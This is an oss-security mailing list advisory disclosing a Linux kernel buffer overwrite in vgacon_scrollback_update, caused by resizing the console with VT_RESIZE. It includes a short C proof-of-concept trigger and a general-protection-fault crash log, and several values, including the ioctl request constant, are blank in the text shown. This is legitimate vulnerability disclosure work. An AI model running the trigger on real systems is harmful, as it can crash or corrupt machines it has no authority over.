  oss-security - Linux Kernel: buffer over write in  vgacon_scrollback_update            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 28 Jul From: 张云海 <zhangyunhai@...ocus.com> To: oss-security@...ts.openwall.com Subject: Linux Kernel: buffer over write in  vgacon_scrollback_update  There is a buffer over write in drivers/video/console/vgacon.c in vgacon_scrollback_update.  The issue is reported by Yunhai Zhang / NSFOCUS Security Team <zhangyunhai@...ocus.com>, assigned via Red Hat.  # Affected Versions The issue is found and tested on The issue is introduced in commit: ([PATCH] vgacon: Add support for soft scrollback) According to code review, all versions older than are affected.  # Root Cause In vgacon_scrollback_update, there is a memcpy without enough bound check: 		scr_memcpyw(vgacon_scrollback_cur->data + 			    vgacon_scrollback_cur->tail, 			    p, c->vc_size_row); Here vgacon_scrollback_cur->data is a buffer of size vgacon_scrollback_cur->size which is a multiple of c->vc_size_row, vgacon_scrollback_cur->tail increase c->vc_size_row each time and reset to zero when exceed vgacon_scrollback_cur->size. Thus, the copy does not seem to overflow. However, c->vc_size_row can be reset by calling ioctl(VT_RESIZE), and a crafted new c->vc_size_row can cause the copy to overflow.  # PoC To trigger the overflow, CONFIG_VGACON_SOFT_SCROLLBACK should be set in .config, and vgacon should be selected as the current console.  	#include <stdio.h> 	#include <stdlib.h> 	#include <unistd.h> 	#include <sys/types.h> 	#include <sys/stat.h> 	#include <sys/ioctl.h> 	#include <fcntl.h>  	int main(int argc, char** argv) 	{ 		int fd = open(argv[1], O_RDWR, 0); 		 		unsigned short size[3] = {8, 0}; 		ioctl(fd, size); // VT_RESIZE  		for (int i = 0; i < 18; i++) { 			write(fd, "\x0a", 1); 		} 	}  GPF in dmesg: 	[   general protection fault, probably for non-canonical address [#1] SMP PTI 	[   CPU: 0 PID: Comm: ls Not tainted #1 	[   Hardware name: QEMU Standard PC + PIIX, BIOS 	[   RIP: 	[   Code: 89 d8 e9 27 ff ff ff 48 c7 07 01 00 00 00 c3 0f 1f 80 00 00 00 00 48 8b 17 48 39 d7 74 35 48 8b 47 08 48 85 c0 74 1c 49 89 c0 <48> 8b 40 10 48 85 c0 75 f4 4c 89 c0 c3 48 3b 78 08 75 f6 48 8b 10 	[   RSP: EFLAGS: 	[   RAX: RBX: RCX: 	[   RDX: RSI: RDI: 	[   RBP: R08: R09: 	[   R10: R11: R12: 	[   R13: R14: R15: 	[   FS:  	[   CS:  DS: ES: CR0: 	[   CR2: CR3: CR4: 	[   DR0: DR1: DR2: 	[   DR3: DR6: DR7: 	[   Call Trace: 	[    ? 	[    	[    	[    	[    	[    ? 	[    	[    	[    	[   RIP: 	[   Code: 0f 1e fa 48 8b 47 20 c3 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 81 fa ff ff ff 7f b8 ff ff ff 7f 48 0f 47 d0 b8 d9 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 05 c3 0f 1f 40 00 48 8b 15 b1 9b 10 00 f7 d8 	[   RSP: EFLAGS: ORIG_RAX: 	[   RAX: ffffffffffffffda RBX: RCX: 	[   RDX: RSI: RDI: 	[   RBP: fffffffffffffe98 R08: R09: 	[   R10: R11: R12: 	[   R13: R14: R15: 	[   Modules linked in: drm_vram_helper drm_ttm_helper ttm drm_kms_helper cec fb_sys_fops joydev syscopyarea input_leds sysfillrect serio_raw sysimgblt mac_hid qemu_fw_cfg sch_fq_codel drm parport_pc ppdev lp parport ip_tables x_tables autofs4 hid_generic usbhid hid psmouse i2c_piix4 pata_acpi floppy 	[   ---[ end trace ]--- 	[   RIP: 	[   Code: 89 d8 e9 27 ff ff ff 48 c7 07 01 00 00 00 c3 0f 1f 80 00 00 00 00 48 8b 17 48 39 d7 74 35 48 8b 47 08 48 85 c0 74 1c 49 89 c0 <48> 8b 40 10 48 85 c0 75 f4 4c 89 c0 c3 48 3b 78 08 75 f6 48 8b 10 	[   RSP: EFLAGS: 	[   RAX: RBX: RCX: 	[   RDX: RSI: RDI: 	[   RBP: R08: R09: 	[   R10: R11: R12: 	[   R13: R14: R15: 	[   FS:  	[   CS:  DS: ES: CR0: 	[   CR2: CR3: CR4: 	[   DR0: DR1: DR2: 	[   DR3: DR6: DR7:  # Patch Linus has rewrite the whole function. However, I provide a one-line-fix patch here to make it easier to backport to older stable kernels.   Regards, Yunhai Zhang / NSFOCUS Security Team  View attachment of type "text/plain" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      